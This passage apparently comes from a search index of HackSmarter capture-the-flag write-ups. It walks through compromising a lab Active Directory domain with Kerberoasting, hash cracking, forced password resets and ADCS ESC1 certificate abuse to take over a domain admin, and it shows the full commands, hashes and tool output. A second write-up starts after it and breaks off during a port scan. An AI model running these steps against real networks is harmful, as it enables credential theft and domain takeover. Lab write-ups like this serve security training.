     Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=DC01.hacksmarter.local\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.hacksmarter.local\n| Not valid before: 2025-09-21T15:35:32\n|_Not valid after:  2026-09-21T15:35:32\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2025-11-21T03:31:37+00:00; -1s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: HACKSMARTER\n|   NetBIOS_Domain_Name: HACKSMARTER\n|   NetBIOS_Computer_Name: DC01\n|   DNS_Domain_Name: hacksmarter.local\n|   DNS_Computer_Name: DC01.hacksmarter.local\n|   Product_Version: 10.0.20348\n|_  System_Time: 2025-11-21T03:30:58+00:00\n| ssl-cert: Subject: commonName=DC01.hacksmarter.local\n| Not valid before: 2025-09-20T02:51:46\n|_Not valid after:  2026-03-22T02:51:46\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n49664/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n51147/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n51148/tcp open  msrpc         Microsoft Windows RPC\n51160/tcp open  msrpc         Microsoft Windows RPC\n51174/tcp open  msrpc         Microsoft Windows RPC\n53744/tcp open  msrpc         Microsoft Windows RPC\n53767/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2025-11-21T03:31:00\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 341.88 seconds\n</code></pre>"},{"location":"HackSmarter-Labs/arasaka/#smb-enumeration","title":"SMB Enumeration","text":"<pre><code>nxc smb 10.1.81.88 -u faraday -p 'hacksmarter123'\nSMB         10.1.81.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)\nSMB         10.1.81.88      445    DC01             [+] hacksmarter.local\\faraday:hacksmarter123 \n\u279c  ~ nxc smb 10.1.81.88 -u faraday -p 'hacksmarter123' --shares\nSMB         10.1.81.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)\nSMB         10.1.81.88      445    DC01             [+] hacksmarter.local\\faraday:hacksmarter123 \nSMB         10.1.81.88      445    DC01             [*] Enumerated shares\nSMB         10.1.81.88      445    DC01             Share           Permissions     Remark\nSMB         10.1.81.88      445    DC01             -----           -----------     ------\nSMB         10.1.81.88      445    DC01             ADMIN$                          Remote Admin\nSMB         10.1.81.88      445    DC01             C$                              Default share\nSMB         10.1.81.88      445    DC01             IPC$            READ            Remote IPC\nSMB         10.1.81.88      445    DC01             NETLOGON        READ            Logon server share \nSMB         10.1.81.88      445    DC01             SYSVOL          READ            Logon server share \n\u279c  ~ nxc smb 10.1.81.88 -u faraday -p 'hacksmarter123' --users \nSMB         10.1.81.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)\nSMB         10.1.81.88      445    DC01             [+] hacksmarter.local\\faraday:hacksmarter123 \nSMB         10.1.81.88      445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               \nSMB         10.1.81.88      445    DC01             Administrator                 2025-09-18 22:40:20 0       Built-in account for administering the computer/domain \nSMB         10.1.81.88      445    DC01             Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain \nSMB         10.1.81.88      445    DC01             krbtgt                        2025-09-21 02:51:44 0       Key Distribution Center Service Account \nSMB         10.1.81.88      445    DC01             Goro                          2025-09-21 15:00:31 0       Loyal to a fault \nSMB         10.1.81.88      445    DC01             alt.svc                       2025-09-21 15:07:42 0       Trapped for eternity \nSMB         10.1.81.88      445    DC01             Yorinobu                      2025-09-21 15:12:44 0        \nSMB         10.1.81.88      445    DC01             Hanako                        2025-09-21 14:59:03 0       Waiting at embers \nSMB         10.1.81.88      445    DC01             Faraday                       2025-09-21 15:06:45 0        \nSMB         10.1.81.88      445    DC01             Smasher                       2025-09-21 15:01:20 0        \nSMB         10.1.81.88      445    DC01             Soulkiller.svc                2025-09-21 15:30:13 0       Certificate managment for soulkiller AI \nSMB         10.1.81.88      445    DC01             Hellman                       2025-09-21 15:04:19 0        \nSMB         10.1.81.88      445    DC01             kei.svc                       2025-09-21 15:05:16 0       Trapped for eternity \nSMB         10.1.81.88      445    DC01             Silverhand.svc                2025-09-21 15:03:10 0       Trapped for eternity \nSMB         10.1.81.88      445    DC01             Oda                           2025-09-21 15:02:14 0        \nSMB         10.1.81.88      445    DC01             the_emperor                   2025-11-06 17:19:03 0        \nSMB         10.1.81.88      445    DC01             [*] Enumerated 15 local users: HACKSMARTER\n</code></pre>"},{"location":"HackSmarter-Labs/arasaka/#bloodhound","title":"Bloodhound","text":"<pre><code>nxc ldap 10.1.81.88 -u faraday -p 'hacksmarter123' --bloodhound --collection ALL --dns-server 10.1.81.88\nSMB         10.1.81.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)\nLDAP        10.1.81.88      389    DC01             [+] hacksmarter.local\\faraday:hacksmarter123 \nLDAP        10.1.81.88      389    DC01             Resolved collection methods: trusts, session, dcom, rdp, objectprops, localadmin, psremote, container, acl, group\nLDAP        10.1.81.88      389    DC01             Done in 00M 04S\nLDAP        10.1.81.88      389    DC01             Compressing output into /home/parrot/.nxc/logs/DC01_10.1.81.88_2025-11-20_224934_bloodhound.zip\n</code></pre> <p>Faraday user has not <code>outbound Object Control</code>. This is a dead-end</p> <p></p>"},{"location":"HackSmarter-Labs/arasaka/#kerberoasting","title":"Kerberoasting","text":"<p>I was able to kerberoast the alt.svc user account</p> <pre><code>nxc ldap 10.1.81.88 -u faraday -p 'hacksmarter123' --kerberoasting output.txt\nSMB         10.1.81.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)\nLDAP        10.1.81.88      389    DC01             [+] hacksmarter.local\\faraday:hacksmarter123 \nLDAP        10.1.81.88      389    DC01             Bypassing disabled account krbtgt \nLDAP        10.1.81.88      389    DC01             [*] Total of records returned 1\nLDAP        10.1.81.88      389    DC01             sAMAccountName: alt.svc memberOf:  pwdLastSet: 2025-09-21 11:07:42.894050 lastLogon:&lt;never&gt;\nLDAP        10.1.81.88      389    DC01             $krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$hacksmarter.local/alt.svc*$68a3d482fdd27f57850eb8b6d0170b30$d63bd43e3b173b49a6465f8b9822015fc0de5bdafe9f6be422f7022e134009511761b6acdf420346b4321062f3a00d4f00b059622302a659353ba882345a6a7b649f7c81e1c21fad65a417f4f4fd809ae59fb1b22f62d420e871c47e0e3f92f5f426469900dec3bdff586c99ab62ef3161f9abd688f28e37efdd2f809f6e37ce4ca0ee55a4312049340b6672a02961aa1968863a3f86d031b4edceb1faef7f6c47f0f8491314d22edb17f02ecfebdf5634f6bc5824545f3993c6d9f2db249da9bd9c06e5a727964ca7145582939e2cf8be6adf1aa9f93b36cda09d5ecf4ae1c8ea4b0f09e30f889e8c77163c84962d6649ed4d5a1bf8d8ae5372d97587554e1ff5ce13b2e774e69e24ee45480b756951434be537a774b2ff27ae80466bd91ebe9cbb3e1aa160c4ab92975a7852a47972c7fb313b621459c41edba616bde952c327056fc587c7285e6865633a7412bfce6059f303ebe556194e25d7c0c533ac10b1ba1c622d96c8a51d4b690133ec91dd0cee9f0d914349936cc6018a5170ab6357a6980b673acb98d4a0d504abe8a432df4136bdb637f586a071432a0b720d7f53e6e4ed613228375d0d63e4445138e5c15caf6beceeac52901e3f0041a93d17efb4a6149d05ba70b8808f16310e22a27e5a53448e9da73853204c5d4181c50fc3517f68281b7e68715165cde3fb113ee3337fa48dc7655d977875384ac49d6f9b2d83b2479d04f7cb80001fbde5d89178a3e8db98c5179e9fbb228c2b85916092872a835bdfe76c6f2e1d10eb09359823c46bcf457c2e811abc7d9afdb17807cd0588695566c397d1a1a8b037025e484e2ac26350bdbb918ce797a99e93f1c01e58f143a43ecf7aaf4422a1c9dd11da2dca635e42f4a2e2cb925b65fabcfc2ebbcad3e73cba9c4822340e4089198395c651f1a94eb7cd056b5eb8d369c12ad678298b6cafa0262c902d438482572a67f6a4249d18c2255560f4a305c5d0aebb3a26ca5b247971ede3fdbe51b27f23d6529d75de841d0fe550c6f0471aa71932a42794fe57e54972ea4c0613789ac151955244690388063e21c66c782146598646ca104e672db5668cf172bafdcae1cb8e82aa9195cef6a83dd6b99552743df211e2639ee758e88291a8a3fc31f1710f51e2636572cf02fb602b7ea8adb89ee4dc7f5a648be2eb49e3dec4dd92bc69b3f09d4962c401b9e8af63baae3190883d12e386653224b7f58eb057a51b73fa6cb63d7d8ef861b4f30b45d656f82a24485d20406a21a09dd1549863588e4d18ac17727c4977f16ff5a865807049962bf4e150feba39c619154cc163225bd549e62f1717816e2d6eb5f589e844e129898992ee9379d797fb99c6a026ed591ebe91e429c3b011b6eeec74cbf2d20afdafaee91e2df5a11404b510613e27588f7fd3613b5a10f90e8aecdaa6cf40433ea11c4e637dc734f200e08f3d0181fec87a6676e00bc47a1837ee5762378d2c231a51b459851f996e2e3373daefc839e84dc37948846a14d55ce081\n</code></pre> <p>Cracked the above hash with John the Ripper</p> <pre><code>sudo john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash\n[sudo] password for parrot: \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 6 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nbabygirl1        (?)     \n1g 0:00:00:00 DONE (2025-11-20 23:29) 100.0g/s 153600p/s 153600c/s 153600C/s 123456..mexico1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p><code>ALT.SVC</code> has <code>generic.all</code> over <code>YORINOBU</code>. So I can change his password</p> <p></p> <p>He also has access to the Windows Remote Services</p> <pre><code>net rpc password \"yorinobu\" \"Valentino1@\" -U \"HACKSMARTER.local\"/\"alt.svc\"%'babygirl1' -S \"10.1.81.88\"\n\u279c  Arasaka nxc smb 10.1.81.88 -u yorinobu -p 'Valentino1@'\nSMB         10.1.81.88      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:False)\nSMB         10.1.81.88      445    DC01             [+] hacksmarter.local\\yorinobu:Valentino1@ \n\u279c  Arasaka nxc winrm 10.1.81.88 -u yorinobu -p 'Valentino1@'\nWINRM       10.1.81.88      5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local)\nWINRM       10.1.81.88      5985   DC01             [+] hacksmarter.local\\yorinobu:Valentino1@ (Pwn3d!)\n</code></pre> <p>Looking at <code>Bloodhound</code> The Yorinobu has <code>Generic-Write</code> over <code>Soulkiller.svc</code> user account, which would allow me do a <code>targetedkerberberoast</code> and dump the <code>Soulkiller.svc</code> password hash</p> <p></p> <pre><code>targetedKerberoast git:(main) ./targetedKerberoast.py -v -d 'HACKSMARTER.local' -u 'yorinobu' -p 'Valentino1@'\n[*] Starting kerberoast attacks\n[*] Fetching usernames from Active Directory with LDAP\n[+] Printing hash for (alt.svc)\n$krb5tgs$23$*alt.svc$HACKSMARTER.LOCAL$HACKSMARTER.local/alt.svc*$0e940bf4b34479f7fc1f4ce6dedbe10c$446431d81883d6971cdce9e81564c327308b4b6bdb2c4d94470ebaae999c6a1fee2e0163b7592f16d36d16c8f29babd86271d626a4196375e6c8ff3297f32f682ba90204b02e75d8296638b3b902ece09f7fdd9d65ad7621106812f04256ef53783446b10f11c222dbb69eb8cfa786363bc7b78db6d1ce5732505e318fdd57b60068954bb1f26ff3ca82ee5207525dfb406cfadc903ed84d3f5f4e3feed4bfbbd39a547b187ebcafefc523a673d383ed6c306cd68a09fe0d8675c2d24d46f6892dbedc951fbec8f6580131955db9f4d8765dc110df4409a00da86c9452656e684e8d48859af2666c6cc369440b1bdb41ef0b26ce67ad58a346a08747cb1f565a8ac2ca08dbdbf12ce82483899c4bfcfdd05588cb12b37ad38c1298ebfca0b0f90c2a1ec61e14916ec8636e123b8896eefb089eac14d85b35a89b454a46f60d8bcc3c0eb199fb816f2aaec672b00df372d324d93ab5d4323b5e9c7f07120bfa0f5a411627cc2904e05229f0ff82c24678c5dc327299ee83ae7a4f2d183ebfa24de356ce7b769383a1262a4373a11c32d179076aa85b12192ac7fc2b69963a2a3e81f38d53eeca6ff708503aa5c5ee33ddb4fd534510362c206bb01d87695884580a39083122e10c28735dfaf961973c14675104f991579638822cd0d86ebdb25df20e416bb2dde849f1d8c3b8c199f47660ea81e30980b87693d5201dfb3326c61bf42b2f010b0e12db0eae76927607033b989765a54ed604c733c459fbbfaed68bea1bbb974e52f160cf0adcb04de68ab7d076cb9a2f1d3e426c8a77d507438467e4c56f959ed7bb5ff3632e678a97e395b79a4c3eb1a0a33e1385609d29c623e97f1f3d91ebb8905732ec546b36348e833b11bd3904ebb35158e6eddd12cc024684944c4ee55bc62f8a20160d3c8576b17cf0fcf21a3cdc1d0f6d79c0900626c0b8e211bf43cf8c64168364b7f2ce3673c5ab240f9c76afd9d90bbf84256dc3ceea1ec7327dab27a76659a331125b139b873ff17a5f2738115db0907c902073044d7f7963b6798318f886f2b899d8e6e07a02fc54f98c2db6848775bb6de99ad4b69989c7e5d6026732308dbec002711186535eb21d3fc6c13d2cbd4cad52fe976e5f2a779aab9283cc34175e4a2b9395923cddb847a3afd347ddac0a6efc63f791263f550247541db082fbbc426257c921f5741f4e012d526ad053b5a567d1ec34fc8adc884f1a03350327415d1b8e2e2025f41b478767892c12f7dc3a59894691bc594d6224026890cb7568f24fa6d4e5f452409ee8d8711572c9d41f192f87a51df139c6d6e3f107ef616a07c821a19e7c246acdeffe9c0101b5ae974886c6475a4c899213faa65c4d36575da8034f8e66f3a9ee2f979795600058e43bc37af1383877069aeb34073eb5727e94a09ac4117e7bf35b0dcae68b2763abd7a28dbe451788fcc3b2edd4a5717f5405d5c579ead470ee04c50cc97661142fb181e175c0f93f8704ddcd64abd704a4b30ad7bf6bdce78ebcf32bb38f40af1e5030ea5cef07d8af91595b304f39020b07e6643f\n[VERBOSE] SPN added successfully for (Soulkiller.svc)\n[+] Printing hash for (Soulkiller.svc)\n$krb5tgs$23$*Soulkiller.svc$HACKSMARTER.LOCAL$HACKSMARTER.local/Soulkiller.svc*$a6083429a01568563ef56ec2f71c45ea$3798c1139fb4f18c906c9aa5e2b73580507694d21e2c9df9697106a09d0efc10837cd2962f6432523a9a1392570d62e2a71c4aff70dcf8673cf3c0f0d5cba2389277661fabe5559bb2218b910b2791fa8b2fde9f76a723e0fd7afc6bea5d4ca6507f086bd9ea29f5c8b21a12f4ca3163bab94676278fd5e719f81e0b1a26c148ff29579466b60433ecdcb27fb1b7641aa8791f1eb2b78fca83a7b3bcdee485c1ac00adf3ee179bb260d6f35fcd8277bf8decf72c43e9a42bf47a3d0a1bd58893b7e1f5529e17e2429bb7db1608ae63fed61b34138593a33fb7b1f6788e78c5ed7479e5a7c39f05c53103694008c4982546e12d5d80bc0a9ef6b700aba77681ab0c387c9f97bc80aa647270b1a068227e7015964cc1d44ccfa18fd48a6d9a16f160072d635a573b37c7aac73d204b0c8eb806c6950405c1aadc5c871a7910d9fce7be14821a2b3ee422a1c3bfc8814465ca99053a1180a9a32b5264a7d0388e6898c00888d1c367366b1961bebe88bb97a6bf28e52bdd9bf8b2119d75aa68f51962bb813c9d0b505628be0ede5e7fb679cc589911d1e2e872cbeb14c4198b0dddc25fd4ec4562c1a1b0f9186713fa425ef4b9e5d043f444337c786b6c3427551cbd968a33cbaf06d749cd7136cd8ebb1b11ee1ab1d7cb56365ef8aa7c7fc2a86f2331cfd794bbdbf1d91738999c4be2527db8bd2a98b824efd6a214e24a4746410487e4bd54a9b1314a3e73650691d65acd9dbff1fbeb05e4351d826afe3578b8b049fbad038a63680809181bf666b51bb94baa61a51df826579b12ce59581e61ac0494e4eebfcac0b9615beb44166102e4b0a3e0a0fbb9fab3e67d8a8105762e0690a2a3c7e617cd0dd62e734998eaf575249ae689f1dd7b9b48ea79e11cc639664709fe574f992a34621a36954b5852cc5f2e99dbb15e63086751465a38b18bcb1cd46cc4c4b92fc570f64b46f579cbff2843e614d1519f176537d7d61bf69796e4bff8a0975010df541ba3b221ede58d9c924b2918e9c789a48f67079d4b3e09874cc2d860bc59b7378fd7269e9b3c7f4aeb2fe60d05b561ccad0692aa6337a7914882fbed62c3297bcfc51beba2f21b83f1f908bbdd98e51a4a14002c31593ba7f35999112fe2e7596b1c5f7010cd06f644fb692b9c5af48b1f984da404c77749c640b73d64d07c24dcd3b5b8e4231b41791d31abf12dc62431c157f1415781aa9090171bfd01b6fe7ec3aac5f026fbc9406dab794303dc901bf1589bad06711c8173d001349f2386e71749725d87d9a7ca513a35283a815a5386030b612a1036a9999b59941af84f046605ff04790b56224ce0c861211d769fe0355dc857f7d711afad617e7e492a181400c6eb2e134595f195d9e4f06c459261ec9b7305757a46cedacb6dd9fb9ba8b6089151f2f3173f1c62905c95f4a53a46756253ef61955b5ff5e457bc87da7e5cb9a9222223139a778e89f99ea032951a4048e59d3391d7fbbae08fa10f17868be3b46caec398f633b2f2849445f2ee43578df0529fea15f80015ddc99016ae553f4ab269f538\n[VERBOSE] SPN removed successfully for (Soulkiller.svc)\n</code></pre> <p>Cracked Soulkiller.svc password hash using John</p> <pre><code>sudo john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt soulkiller.hash\n[sudo] password for parrot: \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 6 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nMYpassword123#   (?)     \n1g 0:00:00:05 DONE (2025-11-20 23:49) 0.1675g/s 1816Kp/s 1816Kc/s 1816KC/s MaRiAnItA..MYfamiLY4377\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>Since <code>soulkiller.svc</code> is a <code>Certificate managment for soulkiller AI</code> Let\u2019s look for a vulnerable Certificate. And We found one</p> <pre><code>certipy find -u soulkiller.svc -p 'MYpassword123#' -dc-ip 10.1.81.88 -target-ip 10.1.81.88 -vulnerable -enable -stdout\n/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.\n  import pkg_resources\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[*] Trying to get CA configuration for 'hacksmarter-DC01-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'hacksmarter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'hacksmarter-DC01-CA' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Got CA configuration for 'hacksmarter-DC01-CA'\n[*] Enumeration output:\nCertificate Authorities\n  0\n    CA Name                             : hacksmarter-DC01-CA\n    DNS Name                            : DC01.hacksmarter.local\n    Certificate Subject                 : CN=hacksmarter-DC01-CA, DC=hacksmarter, DC=local\n    Certificate Serial Number           : 1DBC9F9ECF287FB04FDE66106578611F\n    Certificate Validity Start          : 2025-09-21 15:32:14+00:00\n    Certificate Validity End            : 2030-09-21 15:42:14+00:00\n    Web Enrollment                      : Disabled\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Permissions\n      Owner                             : HACKSMARTER.LOCAL\\Administrators\n      Access Rights\n        ManageCertificates              : HACKSMARTER.LOCAL\\Administrators\n                                          HACKSMARTER.LOCAL\\Domain Admins\n                                          HACKSMARTER.LOCAL\\Enterprise Admins\n        ManageCa                        : HACKSMARTER.LOCAL\\Administrators\n                                          HACKSMARTER.LOCAL\\Domain Admins\n                                          HACKSMARTER.LOCAL\\Enterprise Admins\n        Enroll                          : HACKSMARTER.LOCAL\\Authenticated Users\nCertificate Templates\n  0\n    Template Name                       : AI_Takeover\n    Display Name                        : AI_Takeover\n    Certificate Authorities             : hacksmarter-DC01-CA\n    Enabled                             : True\n    Client Authentication               : True\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Enrollment Flag                     : PublishToDs\n                                          IncludeSymmetricAlgorithms\n    Private Key Flag                    : ExportableKey\n    Extended Key Usage                  : Client Authentication\n                                          Secure Email\n                                          Encrypting File System\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Validity Period                     : 1 year\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : HACKSMARTER.LOCAL\\Soulkiller.svc\n                                          HACKSMARTER.LOCAL\\Domain Admins\n                                          HACKSMARTER.LOCAL\\Enterprise Admins\n      Object Control Permissions\n        Owner                           : HACKSMARTER.LOCAL\\Administrator\n        Write Owner Principals          : HACKSMARTER.LOCAL\\Domain Admins\n                                          HACKSMARTER.LOCAL\\Enterprise Admins\n                                          HACKSMARTER.LOCAL\\Administrator\n        Write Dacl Principals           : HACKSMARTER.LOCAL\\Domain Admins\n                                          HACKSMARTER.LOCAL\\Enterprise Admins\n                                          HACKSMARTER.LOCAL\\Administrator\n        Write Property Principals       : HACKSMARTER.LOCAL\\Domain Admins\n                                          HACKSMARTER.LOCAL\\Enterprise Admins\n                                          HACKSMARTER.LOCAL\\Administrator\n    [!] Vulnerabilities\n      ESC1                              : 'HACKSMARTER.LOCAL\\\\Soulkiller.svc' can enroll, enrollee supplies subject and template allows client authentication\n</code></pre>"},{"location":"HackSmarter-Labs/arasaka/#privilege-escalation","title":"Privilege Escalation","text":"<p>Let\u2019s get the <code>administrator.pfx</code></p> <pre><code>certipy req -username soulkiller.svc@HACKSMARTER.local -password 'MYpassword123#' -target-ip HACKSMARTER.local -dc-ip 10.1.81.88 -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'administrator@HACKSMARTER.local'\n/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.\n  import pkg_resources\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 8\n[*] Got certificate with UPN 'administrator@HACKSMARTER.local'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'administrator.pfx'\n</code></pre> <p>But I couldn\u2019t dump the administrator hash. What happened? Let\u2019s go back to <code>Bloodhound</code></p> <pre><code>certipy auth -pfx administrator.pfx -u administrator -domain HACKSMARTER.local  -dc-ip 10.1.81.88 -debug\n/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.\n  import pkg_resources\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@hacksmarter.local\n[*] Trying to get TGT...\n[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_KEY_EXPIRED(Password has expired; change password to reset)\n</code></pre> <p>In <code>Bloodhound</code> Both Administrator and the_emperor are Domain Admin, Maybe I can get the emperor\u2019s hash</p> <pre><code>certipy req -username soulkiller.svc@HACKSMARTER.local -password 'MYpassword123#' -target-ip DC01.HACKSMARTER.local -dc-ip 10.1.81.88 -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'the_emperor@HACKSMARTER.local'\n/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.\n  import pkg_resources\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Request ID is 10\n[*] Got certificate with UPN 'the_emperor@HACKSMARTER.local'\n[*] Certificate has no object SID\n[*] Saved certificate and private key to 'the_emperor.pfx'\n</code></pre> <p>Then dump the hash</p> <pre><code>certipy auth -pfx the_emperor.pfx -u the_emperor -domain HACKSMARTER.local  -dc-ip 10.1.81.88 -debug\n/home/parrot/.local/pipx/venvs/certipy-ad/lib/python3.11/site-packages/certipy/version.py:1: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.\n  import pkg_resources\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: the_emperor@hacksmarter.local\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'the_emperor.ccache'\n[*] Trying to retrieve NT hash for 'the_emperor'\n[*] Got hash for 'the_emperor@hacksmarter.local': aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133\n</code></pre> <p>Since both the Administrator and the_emperor are Administrator\u2019s, he would have the permissions to read the root.txt file</p> <p></p> <pre><code>*Evil-WinRM* PS C:\\Users\\the_emperor\\Desktop&gt; cd ..\n*Evil-WinRM* PS C:\\Users\\the_emperor&gt; cd ..\n*Evil-WinRM* PS C:\\Users&gt; dir\n\n    Directory: C:\\Users\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         9/18/2025  10:40 PM                Administrator\nd-r---         9/15/2021   3:12 PM                Public\nd-----         9/21/2025   2:56 PM                the_emperor\nd-----         9/21/2025   3:27 PM                Yorinobu\n\n*Evil-WinRM* PS C:\\Users&gt; cd Administrator\n*Evil-WinRM* PS C:\\Users\\Administrator&gt; cd Desktop\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; dir\n\n    Directory: C:\\Users\\Administrator\\Desktop\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website\n-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website\n-a----         9/21/2025   3:31 PM             32 root.txt\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; type root.txt\nfcf1dd0f08dXXXXXXXXXXXXXXXXXXXXXXXX\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; \n</code></pre>"},{"location":"HackSmarter-Labs/ascension/","title":"Ascension","text":""},{"location":"HackSmarter-Labs/ascension/#ascension","title":"Ascension","text":"Info <p>Author: Dcyberguy </p> <p>Status: Published</p> <p>Last edited time: November 22, 2025 12:21 AM</p> <p>Created time: November 21, 2025 7:46 PM</p> <p><code>This is a writeup for the Hacksmarter Lab machine: Ascension</code></p>"},{"location":"HackSmarter-Labs/ascension/#host-information","title":"Host Information","text":"<pre><code>IP Address:                     10.1.98.83\nHost OS:                        Linux\nDifficulty:                     Easy\n</code></pre>"},{"location":"HackSmarter-Labs/ascension/#enumeration","title":"Enumeration","text":"<pre><code>nmap -Pn -sV -sC -p- --min-rate=200 10.1.98.83 -T4\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-21 19:50 EST\nNmap scan report for 10.1.98.83\nHost is up (0.026s latency).\nNot shown: 65525 closed tcp ports (conn-refused)\nPORT      STATE SERVICE  VERSION\n21/tcp    open  ftp      vsftpd 3.0.5\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.0.0.247\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.5 - secure, fast, stable\n|_End of status\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             202 Sep 21 00:04 pwlist.txt\n22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 28:d6:86:58:a1:e4:54:40:b2:52:40:8a:31:6a:c3:14 (ECDSA)\n|_  256 93:86:35:c0:44:59:bb:0b:ab:a0:4a:7f:84:25:23:41 (ED25519)\n80/tcp    open  http     Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It 